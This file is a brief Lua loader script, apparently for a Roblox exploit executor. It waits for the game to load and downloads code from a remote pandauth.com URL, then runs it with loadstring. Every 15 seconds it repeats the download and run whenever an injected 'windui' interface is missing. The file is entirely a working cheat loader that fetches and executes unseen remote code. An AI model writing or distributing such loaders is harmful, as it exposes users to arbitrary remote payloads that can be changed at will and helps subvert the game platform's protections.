if game:IsLoaded() ~= true then
    game.Loaded:Wait()
end

local function checkandrun()
    local ui = gethui()
    if ui == nil then ui = game:GetService("CoreGui") end
    if ui then
        local script = false
        for _, desc in pairs(ui:GetDescendants()) do
            if string.find(string.lower(desc.Name), "windui") then
                script = true
            end
        end

        if script ~= true then

            pcall(function()
                loadstring(game:HttpGet("https://vss.pandauth.com/kv/aee0f08426a8570e"))()
            end)

        end 
    end
end


task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://vss.pandauth.com/kv/aee0f08426a8570e"))()
    end)

    while task.wait(15) do
        checkandrun()
    end
end)
